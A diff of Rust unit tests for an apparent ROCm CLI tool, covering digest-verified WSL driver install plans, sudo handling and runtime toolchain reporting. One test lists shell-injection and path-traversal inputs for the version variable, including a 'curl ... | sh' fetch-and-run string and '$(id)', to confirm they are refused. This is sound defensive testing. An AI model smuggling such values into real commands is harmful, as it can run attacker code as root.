+            .expect("plan verifies the download");
+        let install = commands
+            .iter()
+            .position(|c| c.contains("apt-get install -y '/tmp/"))
+            .expect("plan installs the package");
+        assert!(check < install, "digest must be checked before install");
+    }
+
+    #[test]
+    fn wsl_rocdxg_refuses_a_version_whose_digest_is_unknown() {
+        // An unpinned version is the case where silently falling back to "no
+        // verification" would be most dangerous, because it is reachable from
+        // a single environment variable.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!plan.supported);
+        assert!(!plan.mutating);
+        assert!(plan.commands.is_empty(), "a refusal must run nothing");
+        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
+        assert!(
+            plan.reason.contains(ROCDXG_ALLOW_UNVERIFIED_ENV),
+            "{}",
+            plan.reason
+        );
+    }
+
+    #[test]
+    fn wsl_rocdxg_accepts_a_supplied_digest_for_an_unpinned_version() {
+        // The escape hatch for a release newer than this build: supply the
+        // digest rather than disabling verification.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        let supplied = "a".repeat(64);
+        env.set(ROCDXG_SHA256_ENV, &supplied);
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(plan.supported);
+        let joined = plan.execution_commands().join("\n");
+        assert!(joined.contains(&supplied), "{joined}");
+        assert!(joined.contains("sha256sum -c -"), "{joined}");
+    }
+
+    #[test]
+    fn wsl_rocdxg_rejects_a_malformed_supplied_digest() {
+        // A truncated or mistyped digest must not silently fall back to the
+        // pinned one, which would verify a different artifact than the user
+        // asked for and report success.
+        let mut env = scoped_rocdxg_env();
+        env.set(ROCDXG_SHA256_ENV, "not-a-digest");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!plan.supported);
+        assert!(plan.commands.is_empty());
+        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
+    }
+
+    #[test]
+    fn wsl_rocdxg_unverified_install_takes_an_explicit_opt_out() {
+        // Installing unverified stays possible — it just has to be asked for,
+        // and the plan the user approves has to say so.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(plan.supported);
+        let joined = plan.execution_commands().join("\n");
+        assert!(!joined.contains("sha256sum -c -"), "{joined}");
+        assert!(joined.contains("without verifying it"), "{joined}");
+    }
+
+    #[test]
+    fn wsl_rocdxg_opt_out_reads_negative_values_as_off() {
+        // The opt-out is a boolean, not a presence check. Reading "set to
+        // anything" as yes would turn digest verification off for a package
+        // installed as root on the strength of `=0` — the one value a reader
+        // writes when they mean the opposite.
+        for negative in ["0", "false", "no", "off", ""] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, negative);
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(
+                !plan.supported,
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} disabled verification"
+            );
+            assert!(
+                plan.commands.is_empty(),
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} built an unverified install"
+            );
+        }
+
+        // The affirmative spellings still work, so this is a narrowing of what
+        // counts as yes rather than a removal of the escape hatch.
+        for affirmative in ["1", "true", "yes", "on"] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, affirmative);
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(
+                plan.supported,
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={affirmative:?} was not honoured"
+            );
+        }
+    }
+
+    #[test]
+    fn wsl_rocdxg_refuses_a_version_that_could_escape_the_shell() {
+        // `ROCM_CLI_ROCDXG_VERSION` is interpolated into commands executed via
+        // `sh -c` after `apt-get update` has primed the sudo credential cache,
+        // so a `;` in it would start a second, attacker-chosen command running
+        // as root. The plan must refuse rather than quote its way out.
+        for hostile in [
+            "1.2.0; curl http://example.invalid/x | sh",
+            "1.2.0 && id",
+            "$(id)",
+            "1.2.0`id`",
+            "../../etc/passwd",
+            "1.2.0\nid",
+            "1.2.0 ",
+        ] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", hostile);
+            // An opt-out must not buy past the version check either.
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(!plan.supported, "accepted hostile version {hostile:?}");
+            assert!(
+                plan.commands.is_empty(),
+                "built commands from hostile version {hostile:?}"
+            );
+            // The refused value is echoed back in the plan a human reads, so it
+            // must not be able to forge lines there. Every line the renderer
+            // emits after the header is indented, so an unindented one came
+            // from the value.
+            let rendered = render_driver_install_plan(&plan, false, false);
+            for line in rendered.lines().skip(1) {
+                assert!(
+                    line.starts_with("  "),
+                    "hostile version {hostile:?} forged plan line {line:?} in:\n{rendered}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_drops_sudo_when_already_root() {
+        // Same reason the bare-metal plans take an escalation: containers and
+        // minimal cloud images run as uid 0 with no `sudo` binary, where an
+        // unconditional prefix kills every command before any driver work.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::AlreadyRoot);
+        let joined = plan.execution_commands().join("\n");
+        assert!(!joined.contains("sudo "), "{joined}");
+        assert!(joined.contains("apt-get install -y '/tmp/"), "{joined}");
+        // And it must not demand a binary it no longer uses.
+        assert!(!joined.contains("command -v sudo"), "{joined}");
+        assert!(
+            !plan
+                .preflight_checks
+                .iter()
+                .any(|check| check.contains("`sudo` command is available")),
+            "{:?}",
+            plan.preflight_checks
+        );
+    }
+
+    /// Runs the digest step the plan actually generates, rather than asserting
+    /// that it contains some substrings.
+    ///
+    /// The step this exercises is the trust anchor for a root install, and the
+    /// executable self-test that used to cover it was deleted along with
+    /// `scripts/wsl_setup_rocdxg.sh`. Substring assertions would let a quoting,
+    /// field-order or newline regression in the `printf | sha256sum -c -`
+    /// fragment ship green, so the generated command is pinned whole with
+    /// `assert_eq!` and then executed — with only the two values it embeds
+    /// redirected at a test payload, so the quoting, spacing and field order
+    /// under test are production's rather than a replica's.
+    ///
+    /// Field order in particular is invisible to a `starts_with`/`ends_with`
+    /// pair: `sha256sum -c -` reads `DIGEST  FILENAME`, so emitting the path
+    /// first breaks every real WSL install while still starting with
+    /// `printf '%s  %s\n' '` and ending with `' | sha256sum -c -`.
+    #[cfg(unix)]
+    #[test]
+    fn wsl_rocdxg_generated_digest_step_accepts_only_the_matching_file() {
+        use std::process::Command;
+
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let version = plan.repo_version.clone();
+        let pinned = ROCDXG_PINNED_DIGESTS
+            .iter()
+            .find_map(|(pinned_version, digest)| {
+                (*pinned_version == version.as_str()).then_some(*digest)
+            })
+            .expect("the default version is pinned");
+        let deb_path = format!("/tmp/rocdxg-roct_{version}_amd64.deb");
+        let generated = plan
+            .execution_commands()
+            .into_iter()
+            .find(|c| c.contains("sha256sum -c -"))
+            .expect("plan verifies the download");
+
+        // Whole-string, not `contains`: the digest has to come first and the
+        // two fields have to be separated by exactly the two spaces
+        // `sha256sum -c -` expects.
+        assert_eq!(
+            generated,
+            format!("printf '%s  %s\\n' '{pinned}' '{deb_path}' | sha256sum -c -")
+        );
+
+        let (root, _paths) = test_paths("wsl-rocdxg-digest");
+        fs::create_dir_all(&root).expect("test root");
+        let payload = root.join(format!("rocdxg-roct_{version}_amd64.deb"));
+        fs::write(&payload, b"pretend this is a .deb\n").expect("write payload");
+
+        let digest_of = |path: &Path| -> String {
+            let out = Command::new("sha256sum")
+                .arg(path)
+                .output()
+                .expect("sha256sum runs");
+            assert!(out.status.success());
+            String::from_utf8(out.stdout)
+                .expect("utf8")
+                .split_whitespace()
+                .next()
+                .expect("digest field")
+                .to_owned()
+        };
+        let good = digest_of(&payload);
+
+        // The command under test is the generated one; the only edits are the
+        // digest being checked and the path being checked, so a regression in
+        // how the fragment is built reaches `sh` here instead of being masked
+        // by a replica built to the test's own idea of the right shape.
+        let step = |digest: &str| -> bool {
+            let command = generated
+                .replace(pinned, digest)
+                .replace(&deb_path, &payload.display().to_string());
+            Command::new("sh")
+                .arg("-c")
+                .arg(&command)
+                .output()
+                .expect("sh runs")
+                .status
+                .success()
+        };
+
+        assert!(step(&good), "the matching digest must pass");
+        assert!(
+            !step(&"0".repeat(64)),
+            "a mismatched digest must fail the step"
+        );
+        assert!(!step("deadbeef"), "a malformed digest must fail the step");
+        assert!(!step(""), "an empty digest must fail the step");
+
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn wsl_rocdxg_install_does_not_ask_for_a_reboot() {
+        // ROCDXG is userspace: `ldconfig` publishes it in this boot. The
+        // bare-metal DKMS path is the one that needs a reboot.
+        let _env = scoped_rocdxg_env();
+        let wsl = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!wsl.reboot_required);
+        let rendered = render_driver_install_plan(&wsl, false, false);
+        // Anchor on the install step first: a refusal plan also reports
+        // `reboot_required: false`, renders `post_install_checks:` from its
+        // non-empty `checks`, and contains no `post_reboot` — so the three
+        // assertions below hold against a plan that installs nothing at all.
+        // Only a real install plan carries this command.
+        assert!(
+            rendered.contains("apt-get install -y '/tmp/"),
+            "expected a real install plan, got:\n{rendered}"
+        );
+        assert!(rendered.contains("post_install_checks:"));
+        assert!(!rendered.contains("post_reboot"));
+
+        let bare_metal = build_driver_install_plan(
+            &test_examine("linux", false),
+            "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
+            true,
+            PrivilegeEscalation::Sudo,
+        );
+        assert!(bare_metal.reboot_required);
+        assert!(render_driver_install_plan(&bare_metal, false, false).contains("post_reboot"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_version_is_overridable_and_reaches_every_reference() {
+        // One resolved value drives the archive name, the release tag and the
+        // download path, so an override cannot leave a URL pointing at the
+        // default. The value is resolved at plan-build time rather than left as
+        // a `${VAR:-default}` template, so the plan the user reviews names the
+        // build the install will actually fetch.
+        let mut env = scoped_rocdxg_env();
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert_eq!(plan.repo_version, "1.2.2");
+        let commands = plan.execution_commands().join("\n");
+        // The version is resolved here, not deferred to the shell: the plan the
+        // user approves has to name the build the install will actually fetch.
+        // No `${...}` expansion survives into the commands at all — the digest
+        // is resolved at plan-build time too, which
+        // `wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default`
+        // asserts by name.
+        assert!(
+            !commands.contains("ROCM_CLI_ROCDXG_VERSION"),
+            "version must be resolved at plan-build time, not left as a shell template:\n{commands}"
+        );
+        let occurrences = commands.matches("1.2.2").count();
+        assert!(
+            occurrences >= 3,
+            "version should drive the deb name, the tag and the path; saw {occurrences}"
+        );
+
+        // An override has to reach every one of those references, including the
+        // release URL — the bug this guards is a URL left on the default. The
+        // digest comes along because an unpinned version is refused outright;
+        // see `wsl_rocdxg_refuses_a_version_whose_digest_is_unknown`.
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        env.set(ROCDXG_SHA256_ENV, &"b".repeat(64));
+        let overridden = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert_eq!(overridden.repo_version, "9.9.9");
+        let commands = overridden.execution_commands().join("\n");
+        assert!(
+            commands.contains("rocdxg-roct_9.9.9_amd64.deb"),
+            "{commands}"
+        );
+        assert!(
+            commands.contains(
+                "https://github.com/ROCm/librocdxg/releases/download/v9.9.9/rocdxg-roct_9.9.9_amd64.deb"
+            ),
+            "{commands}"
+        );
+        assert!(
+            !commands.contains("1.2.2"),
+            "override left a reference on the default version:\n{commands}"
+        );
     }
 
     // EAI-7406: distro selection must honor `/etc/os-release` `ID_LIKE`, so that
@@ -31397,6 +34096,58 @@ ID_LIKE="suse opensuse"
         Ok(())
     }
 
+    /// Whether a runtime carries the compiler toolchain is otherwise invisible,
+    /// and `rocm update` reinstalls whatever the runtime recorded — so a user
+    /// who installed without it has no way to see that, or to understand why a
+    /// later build step fails. This is the per-runtime half; `rocm examine`
+    /// reports the same fact for the active one.
+    #[test]
+    fn runtime_list_reports_whether_the_toolchain_is_installed() -> Result<()> {
+        let (root, paths) = test_paths("runtime-list-toolchain");
+        let manifest = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            10,
+        )?;
+        let config = RocmCliConfig {
+            active_runtime_key: Some(manifest.runtime_key.clone()),
+            ..RocmCliConfig::default()
+        };
+
+        // The fixture records `devel: true` with no composition.
+        let rendered = render_runtimes_text(&paths, &config)?;
+        assert!(
+            rendered.contains("toolchain=included"),
+            "a toolchain install must say so:\n{rendered}"
+        );
+
+        // A runtime-only install reports the other way. Written through the
+        // recorded specs, which is what `includes_devel` actually reads.
+        let runtime_only = therock::InstalledRuntimeManifest {
+            devel: false,
+            wheel_composition: Some(therock::WheelRuntimeComposition {
+                source_layout_generation: "canonical".to_owned(),
+                package_specs: vec!["rocm[libraries,device-gfx1201]==7.13.0".to_owned()],
+                rocm_sdk_target: Some("gfx1201".to_owned()),
+            }),
+            ..manifest
+        };
+        fs::write(
+            runtime_manifest_path(&paths, &runtime_only.runtime_key),
+            serde_json::to_vec_pretty(&runtime_only)?,
+        )?;
+        let rendered = render_runtimes_text(&paths, &config)?;
+        assert!(
+            rendered.contains("toolchain=excluded"),
+            "a runtime-only install must say so:\n{rendered}"
+        );
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
     #[test]
     fn runtime_lists_display_build_date_from_version_string() -> Result<()> {
         let (root, paths) = test_paths("runtime-build-date-display");
@@ -31533,6 +34284,71 @@ ID_LIKE="suse opensuse"
         assert!(error.contains("matches multiple installed runtimes"));
         assert!(error.contains("release-pip-gfx120x-all-7-12-0"));
         assert!(error.contains("release-pip-gfx120x-all-7-13-0"));
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    /// Matching a key regardless of case is a convenience for a user who typed
+    /// the wrong one; it must not quietly pick between two installs whose keys
+    /// differ only in case. `runtimes adopt --runtime-key` stores the key
+    /// verbatim while generated keys are lower-cased, so such a pair is
+    /// reachable, and a caller that resolves the same key twice — prune decides
+    /// about a manifest and then names it to the deleter by key — has to get
+    /// the same install both times.
+    ///
+    /// No registry is involved here: the manifests are handed straight to the
+    /// resolver, so this holds on every platform even though only a
+    /// case-sensitive filesystem can store such a pair.
+    #[test]
+    fn runtime_selector_prefers_the_exact_key_over_a_case_twin() -> Result<()> {
+        let (root, paths) = test_paths("runtime-case-twin");
+        let base = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            20,
+        )?;
+        // Newest first, as `load_runtime_manifests` hands them over. The
+        // adopted twin is stamped with the moment it was adopted, so it leads.
+        let manifests = vec![
+            therock::InstalledRuntimeManifest {
+                runtime_key: "RELEASE-PIP-GFX120X-ALL-7-13-0".to_owned(),
+                installed_at_unix_ms: 99,
+                read_only: true,
+                ..base.clone()
+            },
+            base.clone(),
+        ];
+
+        let exact = select_runtime_manifest(&manifests, &base.runtime_key)?;
+        assert_eq!(
+            exact.runtime_key, base.runtime_key,
+            "the key as stored resolves to its own record, not to the newer twin"
+        );
+        let twin = select_runtime_manifest(&manifests, "RELEASE-PIP-GFX120X-ALL-7-13-0")?;
+        assert_eq!(twin.runtime_key, "RELEASE-PIP-GFX120X-ALL-7-13-0");
+
+        // Neither key matches exactly, so the selector genuinely names both.
+        // Reported as the ambiguity it is, like a runtime_id naming several.
+        let error = select_runtime_manifest(&manifests, "Release-Pip-Gfx120X-All-7-13-0")
+            .unwrap_err()
+            .to_string();
+        assert!(
+            error.contains("differ only in letter case"),
+            "an ambiguous selector must be refused, not silently resolved: {error}"
+        );
+        assert!(error.contains("release-pip-gfx120x-all-7-13-0"));
+        assert!(error.contains("RELEASE-PIP-GFX120X-ALL-7-13-0"));
+
+        // The convenience itself is untouched: with one candidate, any casing
+        // still resolves.
+        let only = vec![base.clone()];
+        assert_eq!(
+            select_runtime_manifest(&only, "Release-Pip-Gfx120X-All-7-13-0")?.runtime_key,
+            base.runtime_key
+        );
 
         let _ = fs::remove_dir_all(root);
         Ok(())
@@ -31708,6 +34524,13 @@ ID_LIKE="suse opensuse"
         );
         assert!(!external_root.join(".rocm-cli-runtime.json").exists());
         assert!(runtime_manifest_path(&paths, &adopted.runtime_key).is_file());
+        // No CMake path in the probe means no compiler toolchain in that
+        // environment. `rocm update` reinstalls from this field, so recording
+        // it wrongly would add a toolchain the user never had.
+        assert!(
+            !adopted.devel,
+            "a probe without a CMake path must not claim the toolchain"
+        );
 
         let mut config = RocmCliConfig::default();
         activate_runtime(&paths, &mut config, &adopted.runtime_key)?;
@@ -31719,6 +34542,84 @@ ID_LIKE="suse opensuse"
         let rendered = render_runtimes_text(&paths, &config)?;
         assert!(rendered.contains("* adopted-release-pip-gfx120x-all-7-13-0"));
         assert!(rendered.contains("mode=read-only"));
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    /// The other half of the same derivation: an adopted environment that does
+    /// expose a CMake path has the toolchain, and the manifest must say so or
+    /// the next `rocm update` would quietly reinstall without it.
+    #[test]
+    fn runtime_adopt_records_devel_when_the_probe_finds_cmake() -> Result<()> {
+        let (root, paths) = test_paths("runtime-adopt-devel");
+        let external_root = root.join("external-therock-venv");
+        let scripts_dir = external_root.join(if cfg!(windows) { "Scripts" } else { "bin" });
+        let python_executable = scripts_dir.join(if cfg!(windows) {
+            "python.exe"
+        } else {
+            "python"
+        });
+        let sdk_root = external_root
+            .join("Lib")
+            .join("site-packages")
+            .join("rocm_sdk");
+        let sdk_bin = sdk_root.join("bin");
+        let cmake_path = sdk_root.join("lib").join("cmake");
+        fs::create_dir_all(&scripts_dir)?;
+        fs::create_dir_all(&sdk_bin)?;
+        fs::create_dir_all(&cmake_path)?;
+        let amdhip = sdk_bin.join(if cfg!(windows) {
+            "amdhip64_7.dll"
+        } else {
+            "libamdhip64.so"
+        });
+        let hipblas = sdk_bin.join(if cfg!(windows) {
+            "hipblas.dll"
+        } else {
+            "libhipblas.so"
+        });
+        fs::write(&python_executable, "python")?;
+        fs::write(&amdhip, "amdhip")?;
+        fs::write(&hipblas, "hipblas")?;
+
+        let adopted = adopt_runtime_from_probe(
+            &paths,
+            AdoptRuntimeRequest {
+                python_executable,
+                install_root: external_root,
+                runtime_id: "therock-release:gfx120X-all".to_owned(),
+                runtime_key: "adopted-release-pip-gfx120x-all-7-13-0".to_owned(),
+                replace: false,
+            },
+            therock::RocmSdkPythonProbe {
+                import_ok: true,
+                rocm_sdk_version: Some("7.13.0".to_owned()),
+                root_path: Some(sdk_root.clone()),
+                bin_path: Some(sdk_bin.clone()),
+                cmake_path: Some(cmake_path),
+                runtime_roots: vec![sdk_root],
+                bin_paths: vec![sdk_bin.clone()],
+                library_paths: vec![sdk_bin],
+                resolved_libraries: vec![
+                    therock::RocmSdkLibraryProbe {
+                        shortname: "amdhip64".to_owned(),
+                        paths: vec![amdhip],
+                    },
+                    therock::RocmSdkLibraryProbe {
+                        shortname: "hipblas".to_owned(),
+                        paths: vec![hipblas],
+                    },
+                ],
+                resolved_target_family: Some("gfx120X-all".to_owned()),
+                ..therock::RocmSdkPythonProbe::default()
+            },
+        )?;
+
+        assert!(
+            adopted.devel,
+            "a probe reporting a CMake path must record the toolchain"
+        );
 
         let _ = fs::remove_dir_all(root);
         Ok(())
@@ -34455,6 +37356,62 @@ ID_LIKE="suse opensuse"
         Ok(())
     }
 
+    /// `rocm examine` is the first command a user runs when something ROCm is
+    /// wrong, and "my build cannot find `hipcc`" is now a reachable state by
+    /// design. Reporting the toolchain only from `rocm runtimes list` leaves
+    /// the primary diagnostic unable to answer the question the opt-in
+    /// created. Both polarities are pinned, because a field hardcoded to either
+    /// word reads as working from a single run.
+    #[test]
+    fn examine_runtime_state_reports_whether_the_active_runtime_has_the_toolchain() -> Result<()> {
+        let (root, paths) = test_paths("examine-runtime-toolchain");
+        let manifest = write_test_pip_runtime(
+            &paths,
+            "release-pip-gfx120x-all-7-13-0",
+            "therock-release:gfx120X-all",
+            "7.13.0",
+            10,
+        )?;
+        let config = RocmCliConfig {
+            active_runtime_key: Some(manifest.runtime_key.clone()),
+            ..RocmCliConfig::default()
+        };
+
+        // The fixture records `devel: true` with no composition.
+        let mut output = String::new();
+        append_examine_runtime_state(&mut output, &paths, &config)?;
+        assert!(
+            output.contains("active_runtime_toolchain: included"),
+            "a toolchain runtime must say so:\n{output}"
+        );
+
+        // A runtime-only install reports the other way. Written through the
+        // recorded specs, which is what `includes_devel` actually reads, so
+        // this exercises the same path a real `rocm install sdk` produces.
+        let runtime_only = therock::InstalledRuntimeManifest {
+            devel: false,
+            wheel_composition: Some(therock::WheelRuntimeComposition {
+                source_layout_generation: "canonical".to_owned(),
+                package_specs: vec!["rocm[libraries,device-gfx1201]==7.13.0".to_owned()],
+                rocm_sdk_target: Some("gfx1201".to_owned()),
+            }),
+            ..manifest
+        };
+        fs::write(
+            runtime_manifest_path(&paths, &runtime_only.runtime_key),
+            serde_json::to_vec_pretty(&runtime_only)?,
+        )?;
+        output.clear();
+        append_examine_runtime_state(&mut output, &paths, &config)?;
+        assert!(
+            output.contains("active_runtime_toolchain: excluded"),
+            "a runtime-only runtime must say so:\n{output}"
+        );
+
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
     #[test]
     fn examine_runtime_state_reports_ambiguous_default_runtime_id() -> Result<()> {
         let (root, paths) = test_paths("examine-runtime-ambiguous");
@@ -35298,6 +38255,7 @@ ID_LIKE="suse opensuse"
             read_only: false,
             imported_from: None,
             system_sdk: None,
+            devel: true,
             installed_at_unix_ms,
         };
         fs::create_dir_all(runtime_registry_dir(paths))?;
@@ -35358,6 +38316,7 @@ ID_LIKE="suse opensuse"
                 library_paths: vec![lib_dir],
                 gfx_targets: vec!["gfx120X-all".to_owned()],
             }),
+            devel: false,
             installed_at_unix_ms: 1,
         };
         fs::create_dir_all(runtime_registry_dir(paths))?;
@@ -35396,6 +38355,7 @@ ID_LIKE="suse opensuse"
             read_only: false,
             imported_from: None,
             system_sdk: None,
+            devel: true,
             installed_at_unix_ms: 1,
         }
     }
